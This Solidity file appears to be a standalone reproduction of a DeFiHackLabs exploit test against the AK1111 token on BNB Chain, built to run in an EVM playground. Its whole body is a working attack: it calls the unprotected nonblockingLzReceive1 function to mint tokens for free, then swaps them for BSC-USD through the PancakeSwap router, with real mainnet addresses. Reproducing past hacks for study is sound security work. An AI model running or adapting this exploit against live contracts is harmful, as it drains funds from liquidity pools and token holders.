// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// Ak1111_exp.sol test's testExploit() logic verbatim, but without inheriting
// forge-std Test/BaseTestWithBalanceLog (which depends on the Foundry cheatcode
// contract being deployed; that address has no code in a plain EVM replay, so
// any cheatcode-gated modifier reverts before the real attack logic runs).

address constant BSC_USD = 0x55d398326f99059fF775485246999027B3197955;
address constant AK1111_ADDR = 0xc3B1b45e5784A8efececfC0BE2E28247d3f49963;
address constant CAKE_LP = 0x794ed5E8251C4A8D321CA263D9c0bC8Ecf5fA1FF;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

interface IAk1111 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function nonblockingLzReceive1(uint16 _srcChainId, address _srcAddress, uint256 _nonce, bytes memory _payload)
        external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract Ak1111 {
    function testExploit() external {
        IAk1111 ak1111 = IAk1111(AK1111_ADDR);
        uint256 ak1111Balance = ak1111.balanceOf(CAKE_LP);

        // this function lacks access control. anyone can call it to mint AK1111 tokens for free
        ak1111.nonblockingLzReceive1(0, address(this), ak1111Balance, "");

        ak1111.approve(PANCAKE_ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = AK1111_ADDR;
        path[1] = BSC_USD;
        IPancakeRouter(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ak1111Balance, 0, path, address(this), block.timestamp
        );
    }
}
